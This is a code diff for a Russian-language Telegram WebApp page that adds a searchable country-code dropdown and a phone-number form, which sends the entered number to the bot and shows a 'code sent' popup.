@@ -223,7 +223,6 @@
                     <div class="search-box">
                         <input type="text" class="search-input" id="country-search" placeholder="Поиск страны..." oninput="filterCountries()">
                     </div>
-                    <!-- Countries will be populated by JavaScript -->
                 </div>
             </div>
         </div>
@@ -292,4 +291,123 @@
             { code: '60', flag: '🇲🇾', name: 'Малайзия' },
             { code: '63', flag: '🇵🇭', name: 'Филиппины' },
             { code: '62', flag: '🇮🇩', name: 'Индонезия' },
-            { code: '84', flag: '🇻🇳', name
+            { code: '84', flag: '🇻🇳', name: 'Вьетнам' }
+        ];
+
+        let selectedCountry = countries[0];
+        let tg = window.Telegram.WebApp;
+
+        // Initialize Telegram WebApp
+        tg.expand();
+        tg.enableClosingConfirmation();
+        
+        // Populate countries dropdown
+        function populateCountries() {
+            const dropdown = document.getElementById('country-dropdown');
+            const filteredCountries = filterCountries();
+            
+            dropdown.innerHTML = '';
+            
+            // Add search box
+            const searchBox = document.createElement('div');
+            searchBox.className = 'search-box';
+            searchBox.innerHTML = '<input type="text" class="search-input" id="country-search" placeholder="Поиск страны..." oninput="filterCountries()">';
+            dropdown.appendChild(searchBox);
+            
+            filteredCountries.forEach(country => {
+                const item = document.createElement('div');
+                item.className = 'dropdown-item';
+                item.innerHTML = `
+                    <div class="flag">${country.flag}</div>
+                    <div class="country-info">
+                        <div class="country-name">${country.name}</div>
+                        <div class="country-code">+${country.code}</div>
+                    </div>
+                `;
+                item.onclick = () => selectCountry(country);
+                dropdown.appendChild(item);
+            });
+        }
+
+        function filterCountries() {
+            const searchTerm = document.getElementById('country-search')?.value.toLowerCase() || '';
+            return countries.filter(country => 
+                country.name.toLowerCase().includes(searchTerm) || 
+                country.code.includes(searchTerm)
+            );
+        }
+
+        function selectCountry(country) {
+            selectedCountry = country;
+            document.getElementById('selected-flag').textContent = country.flag;
+            document.getElementById('selected-country').textContent = country.name;
+            document.getElementById('selected-code').textContent = `+${country.code}`;
+            document.getElementById('phone-prefix').textContent = `+${country.code}`;
+            toggleDropdown();
+            document.getElementById('phone').focus();
+        }
+
+        function toggleDropdown() {
+            const dropdown = document.getElementById('country-dropdown');
+            if (dropdown.style.display === 'block') {
+                dropdown.style.display = 'none';
+            } else {
+                dropdown.style.display = 'block';
+                populateCountries();
+                document.getElementById('country-search').focus();
+            }
+        }
+
+        function handleCancel() {
+            tg.close();
+        }
+        
+        function handleContinue() {
+            const phoneInput = document.getElementById('phone');
+            const phone = phoneInput.value.replace(/\D/g, '');
+            
+            if (phone.length >= 5) {
+                const fullPhone = `+${selectedCountry.code}${phone}`;
+                
+                tg.sendData(JSON.stringify({
+                    phone: fullPhone,
+                    action: 'fragment_register',
+                    country: selectedCountry.name
+                }));
+                
+                tg.showPopup({
+                    title: 'Код отправлен',
+                    message: 'Проверьте сообщения в боте',
+                    buttons: [{ type: 'ok' }]
+                });
+                
+            } else {
+                tg.showPopup({
+                    title: 'Ошибка',
+                    message: 'Введите корректный номер телефона',
+                    buttons: [{ type: 'ok' }]
+                });
+            }
+        }
+        
+        // Initialize countries on load
+        document.addEventListener('DOMContentLoaded', function() {
+            populateCountries();
+        });
+        
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function(event) {
+            const dropdown = document.getElementById('country-dropdown');
+            const btn = document.querySelector('.country-btn');
+            if (btn && !btn.contains(event.target) && dropdown && !dropdown.contains(event.target)) {
+                dropdown.style.display = 'none';
+            }
+        });
+
+        // Focus on phone input when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('phone').focus();
+        });
+    </script>
+</body>
+</html>
